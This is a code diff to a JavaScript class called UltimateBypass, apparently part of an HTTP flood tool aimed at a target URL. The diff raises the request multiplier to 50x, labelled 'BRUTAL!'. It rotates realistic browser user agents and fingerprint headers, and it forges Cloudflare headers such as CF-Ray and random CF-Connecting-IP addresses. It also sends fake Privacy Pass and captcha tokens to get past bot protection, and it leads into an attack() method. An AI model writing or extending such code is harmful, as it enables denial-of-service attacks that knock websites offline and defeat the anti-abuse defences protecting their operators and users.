@@ -424,8 +424,8 @@ export class UltimateBypass {
     constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null, captchaConfig = null) {
         this.url = new URL(targetUrl);
         this.duration = duration;
-        this.rpc = rpc * 30; // 30x multiplier
-        this.userAgents = userAgents;
+        this.rpc = rpc * 50; // 50x multiplier - BRUTAL!
+        this.userAgents = userAgents.length > 0 ? userAgents : this.getAdvancedUserAgents();
         this.referers = referers;
         this.proxies = proxies;
         this.active = true;
@@ -434,6 +434,22 @@ export class UltimateBypass {
         // Initialize both systems
         this.privacyPass = new PrivacyPassBypass(targetUrl, 1, 1, userAgents, referers, proxies);
         this.captchaBypass = new CaptchaBypass(targetUrl, 1, 1, userAgents, referers, proxies, captchaConfig);
+    }
+
+    getAdvancedUserAgents() {
+        return [
+            // Latest Chrome versions with realistic variations
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            // Latest Firefox
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
+            // Edge
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+            // Safari
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
+        ];
     }
 
     async start() {
@@ -457,18 +473,32 @@ export class UltimateBypass {
     generateHeaders() {
         const token = this.privacyPass.getToken();
         const captcha = this.captchaBypass.getCaptchaSolution();
+        const userAgent = Tools.randomChoice(this.userAgents);
         
         const privacyPassHeader = `version=${token.version}; type=${token.type}; nonce=${token.nonce}`;
         
         const headers = {
             'Host': this.url.host,
-            'User-Agent': this.userAgents.length > 0 
-                ? Tools.randomChoice(this.userAgents)
-                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'User-Agent': userAgent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': Tools.randomChoice([
+                'en-US,en;q=0.9',
+                'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                'en-GB,en;q=0.9,en-US;q=0.8'
+            ]),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Cache-Control': Tools.randomChoice(['no-cache', 'max-age=0', 'no-store']),
             'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': Tools.randomChoice(['none', 'same-origin', 'cross-site']),
+            'Sec-Fetch-User': '?1',
+            // Modern browser headers
+            'Sec-CH-UA': this.generateSecChUa(userAgent),
+            'Sec-CH-UA-Mobile': '?0',
+            'Sec-CH-UA-Platform': this.getPlatform(userAgent),
+            'DNT': '1',
             // PrivacyPass
             'CF-Authorization': `Bearer ${token.signature}`,
             'Privacy-Pass': privacyPassHeader,
@@ -478,8 +508,8 @@ export class UltimateBypass {
             'G-Recaptcha-Response': captcha.token,
             'CF-Turnstile-Response': captcha.token,
             'Captcha-Token': captcha.token,
-            // Advanced spoofing
-            'CF-Ray': Tools.randomString(16) + '-SJC',
+            // Advanced CF spoofing
+            'CF-Ray': Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'DFW', 'ORD', 'ATL']),
             'CF-Connecting-IP': Tools.randomIPv4(),
             'CF-IPCountry': 'US',
             'CF-Visitor': '{"scheme":"https"}',
@@ -489,6 +519,26 @@ export class UltimateBypass {
         };
 
         return headers;
+    }
+
+    generateSecChUa(userAgent) {
+        if (userAgent.includes('Chrome/120')) {
+            return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
+        } else if (userAgent.includes('Chrome/119')) {
+            return '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"';
+        } else if (userAgent.includes('Edge')) {
+            return '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"';
+        } else if (userAgent.includes('Firefox')) {
+            return '';
+        }
+        return '"Not_A Brand";v="99", "Chromium";v="120"';
+    }
+
+    getPlatform(userAgent) {
+        if (userAgent.includes('Windows')) return '"Windows"';
+        if (userAgent.includes('Macintosh')) return '"macOS"';
+        if (userAgent.includes('Linux')) return '"Linux"';
+        return '"Unknown"';
     }
 
     async attack() {
